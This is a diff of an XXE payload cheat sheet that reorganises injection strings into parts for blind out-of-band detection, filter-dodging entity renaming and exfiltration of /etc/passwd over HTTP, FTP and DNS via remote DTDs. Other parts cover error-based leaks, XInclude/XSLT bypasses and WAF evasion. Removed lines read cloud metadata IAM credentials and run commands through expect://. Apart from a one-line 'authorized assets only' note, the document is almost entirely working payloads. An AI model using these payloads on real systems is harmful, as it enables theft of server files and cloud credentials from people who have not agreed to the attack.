@@ -1,37 +1,103 @@
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "//BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
-<!DOCTYPE stockCheck[<!ENTITY%xxe SYSTEM"http://BURP-COLLABORATOR-SUBDOMAIN">%xxe;]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "file:///c:/windows/win.ini"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "expect://id"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "expect://ls -la"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "ftp://BURP-COLLABORATOR-SUBDOMAIN:21/xxe"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "gopher://BURP-COLLABORATOR-SUBDOMAIN:8080/_GET /xxe"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "dict://BURP-COLLABORATOR-SUBDOMAIN:11211/xxe"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "jar:http://BURP-COLLABORATOR-SUBDOMAIN/xxe.jar!/xxe.dtd"> %xxe; ]>
-<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
-﻿<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN%0a"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN%0d"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN%09"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN%20"> %xxe; ]>
-<root><stockCheck><!DOCTYPE xxe [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]></stockCheck></root>
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe;]>
-<!DOCTYPE stockCheck SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd" [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
-<!DOCTYPE stockCheck [<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %remote;]>
-<!DOCTYPE stockCheck [<!ENTITY % dtd SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %dtd;]>
-<!DOCTYPE stockCheck [<!ENTITY % payload SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %payload;]>
-<!DOCTYPE stockCheck [<!ENTITY % blind SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %blind;]>
-<!DOCTYPE stockCheck [<!ENTITY % oob SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %oob;]>
-<!DOCTYPE stockCheck [<!ENTITY % shell SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %shell;]>
-<!DOCTYPE stockCheck [<!ENTITY % exfil SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %exfil;]>
-<!DOCTYPE stockCheck [<!ENTITY % data SYSTEM "file:///etc/passwd"> <!ENTITY % oob SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %oob;]>
-<!DOCTYPE stockCheck [<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> <!ENTITY % oob SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/xxe.dtd"> %oob;]>
+# XXE BLIND & BYPASS PAYLOADS 2026 (rewritten - wired to XXE-exfil-server-side.dtd)
+# Replace: YOUR-SERVER  BURP-COLLABORATOR-SUBDOMAIN  YOUR-DNS
+
+# ============ PART 1 - BLIND OOB DETECTION LADDER ============
+# (fires a DNS/HTTP hit to your collab; brute egress diversity)
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
+<!DOCTYPE data [ <!ENTITY xxe SYSTEM "https://BURP-COLLABORATOR-SUBDOMAIN"> ]>
+<!DOCTYPE data [ <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
+<!DOCTYPE data [ <!ENTITY % xxe SYSTEM "ftp://BURP-COLLABORATOR-SUBDOMAIN:21/x"> %xxe; ]>
+<!DOCTYPE data [ <!ENTITY % xxe SYSTEM "gopher://YOUR-SERVER:8080/_GET /x"> %xxe; ]>
+<!DOCTYPE data [ <!ENTITY % xxe SYSTEM "dict://YOUR-SERVER:11211/x"> %xxe; ]>
+<!DOCTYPE data [ <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN%0a"> %xxe; ]>
+<!DOCTYPE data [ <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN%0d%0a"> %xxe; ]>
+
+# ============ PART 2 - PARAMETER-NAME ROTATION (dodge dtd-heuristic filters) ============
+<!DOCTYPE data [<!ENTITY % remote SYSTEM "http://YOUR-SERVER/xxe.dtd"> %remote;]>
+<!DOCTYPE data [<!ENTITY % dtd SYSTEM "http://YOUR-SERVER/xxe.dtd"> %dtd;]>
+<!DOCTYPE data [<!ENTITY % payload SYSTEM "http://YOUR-SERVER/xxe.dtd"> %payload;]>
+<!DOCTYPE data [<!ENTITY % blind SYSTEM "http://YOUR-SERVER/xxe.dtd"> %blind;]>
+<!DOCTYPE data [<!ENTITY % oob SYSTEM "http://YOUR-SERVER/xxe.dtd"> %oob;]>
+<!DOCTYPE data [<!ENTITY % shell SYSTEM "http://YOUR-SERVER/xxe.dtd"> %shell;]>
+<!DOCTYPE data [<!ENTITY % exfil SYSTEM "http://YOUR-SERVER/xxe.dtd"> %exfil;]>
+
+# ============ PART 3 - BLIND EXFIL: CLIENT SIDE (pair with XXE-exfil-server-side.dtd) ============
+# A/HTTP exfil (b64 keeps output readable):
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/exfil.dtd">
+  %remote;
+]>
+<data>&send;</data>
+# B/FTP exfil (java ftp path):
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/ftp.dtd">
+  %remote;
+]>
+<data>&exfil;</data>
+# C/DNS exfil:
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///etc/hostname">
+  <!ENTITY % remote SYSTEM "http://YOUR-SERVER/dns.dtd">
+  %remote;
+]>
+<data>&send;</data>
+
+# ============ PART 4 - BLIND ERROR-BASED (no OOB server needed) ============
+# internal (libxml/php verified):
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %error;
+]>
+<data>x</data>
+# external-dtd (java harder parsers): serve D from the dtd file:
+<?xml version="1.0"?>
+<!DOCTYPE data [ <!ENTITY % remote SYSTEM "http://YOUR-SERVER/error.dtd"> %remote; ]>
+<data>x</data>
+
+# ============ PART 5 - PARSER HARDENING BYPASSES (DTO blocked) ============
+# XInclude (not DTD -> still enabled on most stacks):
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="file:///etc/passwd" parse="text"/>
+</root>
+# XSLT document():
+<xsl:template match="/"><xsl:copy-of select="document('file:///etc/passwd')"/></xsl:template>
+# xsd:include -> OOB;
+<xs:include schemaLocation="http://YOUR-SERVER/evil.xsd"/>
+
+# ============ PART 6 - WAF/ENCODING FILTER BYPASS ============
+# no-space compact:
+<!DOCTYPE data[<!ENTITY%xxe SYSTEM"http://YOUR-SERVER">%xxe;]>
+# %-encoded parameter-entity name:
+<!DOCTYPE data [ <!ENTITY &#37; xxe SYSTEM "http://YOUR-SERVER"> %xxe; ]>
+# UTF-16:
+<?xml version="1.0" encoding="UTF-16"?>
+<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
+# BOM-prefixed (parser sees UTF-8):
+<!DOCTYPE data [<!ENTITY % xxe SYSTEM "http://YOUR-SERVER"> %xxe; ]>
+# CRLF inside URI:
+<!DOCTYPE data [ <!ENTITY % xxe SYSTEM "http://YOUR-SERVER%0d%0a"> %xxe; ]>
+# DOCTYPE late (inside root element):
+<root><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;</root>
+# CDATA-wrapped for markup-filter stacks:
+<![CDATA[<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>]]>
+# double-encoded:
+&lt;!DOCTYPE data [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+
+# ============ PART 7 - WEB PLATFORM LANDING ZONES ============
+# JSON polyglot (converter engines):
+{"xml":"<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>"}
+# param-injected XML:
+param=<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>
+# multipart file part carrying OOXML/SVG doctype - see ultimate file sec 13/14.
+
+# ============ REMEMBER ============
+# Detection first (Part 1) locates the sink; THEN Part 3-4 exfil.
+# All payloads target YOUR OWN box / authorized assets only.
